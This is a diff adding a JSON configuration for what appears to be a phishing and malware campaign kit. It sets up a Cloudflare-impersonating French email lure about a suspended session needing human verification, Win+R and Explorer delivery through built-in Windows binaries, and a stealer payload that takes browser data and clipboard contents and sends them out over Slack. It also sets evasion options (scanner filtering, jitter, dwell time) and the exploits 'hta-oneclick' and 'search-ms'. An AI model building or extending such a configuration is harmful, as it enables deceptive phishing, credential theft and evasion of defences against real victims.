@@ -1,0 +1,41 @@
+{
+  "id": "cloudflare",
+  "label": "Vérification Cloudflare",
+  "persona": {
+    "brand": "Cloudflare",
+    "voice": "bandeau d'infrastructure, impersonnel",
+    "urgency": "medium",
+    "lexicon": ["vérification", "humain", "navigateur", "sécurité"]
+  },
+  "scenarios": ["captcha", "wifi_portal"],
+  "channels": {
+    "email": {
+      "subject": "Votre session {ref} nécessite une vérification",
+      "body": "Bonjour {name},\n\nVotre requête a été temporairement suspendue par notre protection automatique. Vérifiez que vous êtes bien humain pour rétablir l'accès :\n\n{lure}\n\nSi rien ne se passe, mettez votre navigateur à jour avant {deadline}.\n\n— Protection Cloudflare, {ref}"
+    }
+  },
+  "context": {
+    "inject": ["ref", "deadline", "name"]
+  },
+  "techniques": {
+    "surfaces": ["winr", "explorer"],
+    "min_reliability": 4,
+    "prefer_tags": ["default", "lolbin"],
+    "avoid": ["winr-certutil"]
+  },
+  "payload": {
+    "kind": "stealer",
+    "collect": ["browser", "clipboard"],
+    "exfil": "slack",
+    "sleep": 60,
+    "jitter": 0.5,
+    "edr_hint": ""
+  },
+  "opsec": {
+    "filter_scanners": true,
+    "dwell_hours": 12,
+    "variant_count": 2
+  },
+  "chain": ["lure", "stager", "stage2", "collect", "exfil"],
+  "exploits": ["hta-oneclick", "search-ms"]
+}
